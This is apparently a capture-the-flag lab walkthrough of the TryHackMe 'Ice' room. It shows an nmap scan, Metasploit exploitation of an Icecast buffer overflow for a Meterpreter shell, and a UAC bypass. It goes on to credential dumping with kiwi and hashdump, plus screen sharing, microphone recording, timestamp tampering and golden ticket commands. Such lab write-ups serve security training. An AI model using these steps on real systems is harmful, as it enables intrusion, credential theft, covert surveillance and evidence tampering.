# <div align="center">[ICE](https://tryhackme.com/r/room/ice)</div>
<div align="center">
<img src="https://miro.medium.com/v2/resize:fit:899/1*TxtDRv-bMxtlYtTwQ7TdCg.png" height="300"></img>
</div>

# <div align="center">Task 2. Recon</div>

## Let make a Nmap scan to identify running services
```
death@esther:~$ nmap 10.10.203.69 -sV -Pn -A --script=vuln -T 4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 09:07 IST
Nmap scan report for 10.10.203.69
Host is up (0.15s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
8000/tcp  open  http               Icecast streaming media server
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 806.12 seconds
```

### According to scan results:
* #### Windows 7 is used.
* #### Microsoft Remote Desktop (MSRDP) is running on port ```3389```.
* #### HTTP is running on port 8000 with ```Icecast``` service.
* #### The Host is ```DARK-PC```.

# <div align="center">Task 3. Gain Access</div>

### As the IceCast media server is  present let search of any vulnerability.

![image](https://github.com/user-attachments/assets/b0f90db5-8ab2-4eae-84b9-42623873d814)

### In IceCast server a [CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561/) is present.
* #### Becouse of buffer overflow it alows an attacker to execute code.
* #### It have 6.4 Impact score.
* #### It can be exploit by metasploit.

## Let exploit using Msfconsole.
* #### To open msfconsole type msfconsole on termial.
* #### search for Icecast

![image](https://github.com/user-attachments/assets/c6d30d10-fe9b-4ad8-a62e-6f9e4f2b0c85)

### This is the exploit ```exploit/windows/http/icecast_header``` we were going to use.
* #### For using this expoit type ```Use 0``` on termial.

![image](https://github.com/user-attachments/assets/41eb5515-fd79-4902-a8c7-412ebdf175f9)

### Let configure this Exploit to gain Shell.

* #### Type ```show options``` so knew about required settings.

![image](https://github.com/user-attachments/assets/024e6a76-e14c-4101-b7d9-798a3e0f078a)

* #### We only need to set is RHOSTS and Our LHOST the Target Address.
* #### For setting RHOSTS use:
```
set RHOSTS <Target IP>
```

![image](https://github.com/user-attachments/assets/fa47950a-1847-45b5-bc6e-198a3e1414cb)

* #### For setting LHOST use:
```
set LHOST <Target IP>
```
![image](https://github.com/user-attachments/assets/9f3acd6b-a3c3-4d20-a3db-f0c030f8ab52)


### So it time to Run Exploit
```
run
```

![image](https://github.com/user-attachments/assets/ba03e8ef-93a6-4599-8655-88127d4876af)

### We got the meterpreter Shell

## <div align="center"> Task 4. Escalate</div>
###  Let get the user id using command
```
getuid
```

![image](https://github.com/user-attachments/assets/c97d9f94-5a8f-4410-bf84-c8a512020b6e)

* ### The ```Dark``` is the user.

### Let take a view at system info.
```
sysinfo
```

![image](https://github.com/user-attachments/assets/4d8f5795-c2d8-46b1-8f5c-add9b7efa21d)

* ### The buid is ```7601```.
* ### The Architecture is ```x64```.

### Let run a post module of recon to get more way to exploit this system.
```
run post/multi/recon/local_exploit_suggester
```

![image](https://github.com/user-attachments/assets/9e70bc03-f656-42e2-9963-f9f681fb569e)

* ### The first exploit we got is
```
exploit/windows/local/bypassuac_eventvwr
```

## oh sry my machine got expired

### Now we have an exploit let backgound this session using 
```
ctrl + z
```
![image](https://github.com/user-attachments/assets/7c348c05-8a42-436d-a556-2946f805e2c2)

### But before running use command back to back from previous exploit
```
back
```
![image](https://github.com/user-attachments/assets/17b468ba-07ba-4ed2-81a3-d010921e7e9e)

### So, let run the exploit we found.
```
use exploit/windows/local/bypassuac_eventvwr
```
![image](https://github.com/user-attachments/assets/48fe5f45-3065-4835-8639-d057e9dc6405)

### Now let see options this exploit
```
show options
```
![image](https://github.com/user-attachments/assets/a9d3c6da-4e91-4d40-9814-4e9723666964)

### We need to change the LHOST and Set the Sessions
* #### Let set Lhost 
```
set LHOST 10.17.120.99
```
* ### Set session
```
set session 1
```
![image](https://github.com/user-attachments/assets/090bcc50-7b3c-4d20-bca4-c5e0822fca4b)

* ### let run this exploit
```
run
```
### The exploit ran successfully.

![image](https://github.com/user-attachments/assets/e1754257-de53-47fe-a2ac-b47b155a3f02)

### Let check permission listed allows us to take ownership of files?
```
getprivs
```
![image](https://github.com/user-attachments/assets/c8f24c11-58d3-4e74-9ab9-80f9a4cb6c32)

### SeTakeOwnershipPrivilege allow us to take ownership.

## <div align="center"> Task 5 Looting</div>

## Let list the process uisng command:
```
ps
```

![image](https://github.com/user-attachments/assets/d3cad140-e1bf-4a16-b8eb-d61dec68df4c)

### We were going to migrate the process run by admin.
```
migrate -N spoolsv.exe
```

![image](https://github.com/user-attachments/assets/b3072cee-555e-4458-b114-769c021485ea)


### After migratre check for uid, as we sucessfully migrated and we are noW NT AUTHORITY.

### Let loot the site 
```
load kiwi
```
* ###  Kiwi extensions to perform various types of credential-oriented operations, such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and much more.
![image](https://github.com/user-attachments/assets/e61fc830-fb43-4d0a-a7a9-2b8ae6237c12)

### We can use help command to get help of kiwi.
### So first we going to Retrieve all credentials.
```
creds_all
```

![image](https://github.com/user-attachments/assets/442eb822-c961-4845-839d-2cd9eb6e9b0a)

* ### The password for dark is ```Password01!```.

## <div align="center">Task 6. Post-Exploitation</div>

### Let dump all the passwords.
```
hashdump
```

### We can also share the screen of target using 
```
screenshare
```

![image](https://github.com/user-attachments/assets/8774abf3-f319-4e73-9ef9-919e47fa2438)

### We can even record from a microphone attached to the system using command.
```
record_mic
```

### To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this?
```
timestomp
```
### Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
```
golden_ticket_create
```

## Thankyou 😄
